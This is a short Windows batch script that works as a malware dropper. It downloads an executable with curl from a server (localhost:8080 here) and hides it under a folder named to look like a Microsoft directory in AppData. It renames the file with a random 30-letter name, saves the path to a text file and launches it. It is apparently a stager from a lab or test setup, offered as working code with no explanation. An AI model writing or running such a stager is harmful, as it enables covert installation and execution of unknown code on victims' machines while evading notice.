@REM @echo off

goto add_end
@REM generate random file name

:add
set /a x=%random% %% 26 
set filename=%filename%!string:~%x%,1!
goto :eof
@REM end random

:add_end

setlocal enabledelayedexpansion
set "string=abcdefghijklmnopqrstuvwxyz"
set "filename="
for /L %%i in (1,1,30) do call :add
echo %filename%
@REM goto :eof

curl http://localhost:8080/target.exe -o monitor.exe
set home=%userprofile%\AppData\Roaming\Microsoft\Monitor
mkdir %home%
move monitor.exe %home%\%filename%.exe

cd /d %home%
echo %home%\%filename%.exe > filename.txt
start %filename%.exe

@REM exit
